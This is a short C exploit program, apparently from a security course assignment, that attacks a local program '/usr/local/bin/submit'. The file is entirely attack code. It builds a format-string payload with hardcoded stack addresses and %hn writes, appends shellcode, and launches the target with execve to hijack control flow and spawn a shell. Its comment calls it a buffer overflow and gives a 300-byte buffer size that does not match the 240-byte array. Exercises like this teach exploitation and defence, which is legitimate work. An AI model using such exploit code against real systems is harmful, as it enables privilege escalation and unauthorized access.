/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit" // or submitV2


int main(void) {
	char *env[1];
    char *argv[4];
    char argbuf[240] = {0}; // 300 for buffer, 4 for ebp, 4 for eip
    char *ptr;

    // create the argbuf
    memset(argbuf, '.', sizeof(unsigned char)*240);
    memcpy(argbuf, "\x9c\xdb\xbf\xff\x9e\xdb\xbf\xff%56284x%24$hn%9147x%25$hn\xff\xff\xff", 36);
    ptr = argbuf + 36;
    memcpy(ptr, shellcode, strlen(shellcode));
	// another way
	argv[0] = argbuf;
	argv[1] = "-v"; 
    argv[2] = NULL;
    argv[3] = NULL;

	env[0] = NULL;

	execve(TARGET, argv, env);
    fprintf(stderr, "execve failed\n");

	
	return 1;
}
